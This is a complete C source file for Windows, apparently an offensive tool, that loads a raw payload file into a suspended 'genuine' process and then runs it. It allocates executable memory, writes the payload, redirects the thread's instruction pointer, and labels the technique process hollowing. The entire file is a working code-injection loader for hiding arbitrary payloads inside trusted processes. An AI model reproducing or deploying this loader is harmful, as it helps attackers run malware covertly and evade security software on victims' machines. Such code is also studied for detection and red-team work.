#include <windows.h>
#include <stdio.h>


int main(int argc, char *argv[])
{
    printf("Reminder: This will only work with .bin files or raw payload\n");

    if (argc < 3)
    {

        printf("Usage:%s <Genuine_Process> <Payload BIN File>\n", argv[0]);
        return 1;
    }

    void *exec;

    FILE *file = fopen(argv[2], "rb");

    fseek(file, 0, SEEK_END);
    long MalSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    byte *buffer = (byte *)malloc(MalSize);

    fread(buffer, 1, MalSize, file);
    fclose(file);

    STARTUPINFOA si = {
        sizeof(si),
    };

    PROCESS_INFORMATION pi;

    if (!CreateProcessA(argv[1], NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
    {

        printf("[-] Error Creating Process\n");

        return 1;
    }

    printf("[+] Process Created\n");

    exec = VirtualAllocEx(pi.hProcess, NULL, MalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (exec == NULL)
    {

        printf("[-] Error Allocating Memory\n");

        return 1;
    }

    printf("[+] Memory Allocated\n");

    if (!WriteProcessMemory(pi.hProcess, exec, buffer, MalSize, NULL))
    {

        printf("[-] Error Writing Memory\n");

        return 1;
    }

    printf("[+] Payload written to Memory\n");

    CONTEXT CT;
    CT.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &CT))
    {
        printf("[-] Error Getting Thread Context\n");

        return 1;
    }

    printf("[+] Retrived the Context of the Thread\n");

    CT.Rip = (DWORD64)exec;

    if (!SetThreadContext(pi.hThread, &CT))
    {
        printf("[-] Error Setting Thread Context\n");

        return 1;
    }

    printf("[+] Setting the Payload to the Instruction Pointer\n");

    Sleep(18);

    ResumeThread(pi.hThread);

    printf("[+] Process Hollowing Successful\n");

    free(buffer);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
